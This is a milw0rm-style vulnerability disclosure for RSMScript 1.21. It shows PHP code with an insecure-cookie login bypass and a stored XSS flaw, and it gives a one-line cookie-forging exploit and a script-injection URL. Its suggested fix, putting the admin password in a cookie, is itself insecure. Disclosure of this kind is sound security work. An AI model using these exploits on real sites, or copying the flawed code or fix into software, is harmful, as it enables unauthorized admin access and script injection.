@@ -1,0 +1,96 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : RSMScript 1.21
+Download       : http://www.hotscripts.com/jump.php?listing_id=78547&jump_type=1
+Vulnerability  : Insecure Cookie Handling / XXS
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+#########################################################################################
+[0x02] Bug: [Insecure Cookie Handling]
+######
+
+Bugged file is: /[path]/verify.php
+
+[CODE]
+
+if($admin_pass == $code)
+{
+  setcookie("verified", "null", time()+1800);
+  header( 'refresh: 0; url=update.php' );
+}
+
+[/CODE]
+
+As we can see, if the password "$code" typed is the same of $admin_pass, so you log in,
+cookie is set with the name "verified" and with content "null". So, a malicious user
+can just set up a cookie with that name and value, and then he will be logged as the 
+admin.
+
+[!] FIX: A fix could be to put as a content or cookie name the password. Example:
+
+[CODE] setcookie("verified", "$admin_pass", time()+1800); [/CODE]
+
+
+[!] EXPLOIT: javascript:document.cookie = "verified=null; path=/";
+
+#########################################################################################
+[0x03] Bug: [XSS]
+######
+
+To exploit this bug, we must be logged in. Just bypass the login with the Cookie ;)
+There are two bugged file.
+
+1) /[path/submit.php
+   In this file, we can put arbitrary data into a .txt file.
+
+   [CODE]
+
+    $quote = $_REQUEST['quote'];
+    $writePage = fopen('quotes.txt', 'a') or die("can't open file");
+	fwrite($writePage, "\t");
+    fwrite($writePage, stripslashes($quote));
+    fclose($writePage);
+
+   [/CODE]
+
+   [!] FIX: Just filter direct user input.
+
+
+2) /path/update.php
+   This file gets quotes.txt content, and print it directly into html code. 
+   In 1) we saw that we can put arbitrary data into this .txt file. Just
+   Put js code ;)
+
+   [CODE]
+
+    $quotes = file_get_contents("quotes.txt");
+    $quotes= preg_split("/[\t]+/", $quotes);
+    $i = 0;
+    $noQuotes = sizeOf($quotes);
+    while ($i < $noQuotes)
+    {
+        $quote = $quotes[$i];
+        echo '<option value='.$i.'>'.$quote.'</option>';
+        $i = $i + 1;
+    }
+
+    [/CODE]
+
+    [!] FIX: A fix could be just to filter input before being printed in html code.
+
+
+## How to exploit this bugs?
+
+[!] EXPLOIT: /[path]/submit.php?quote=<script>alert("XSS")</script>
+
+#########################################################################################
+[/END]
+
+# milw0rm.com [2008-12-17]
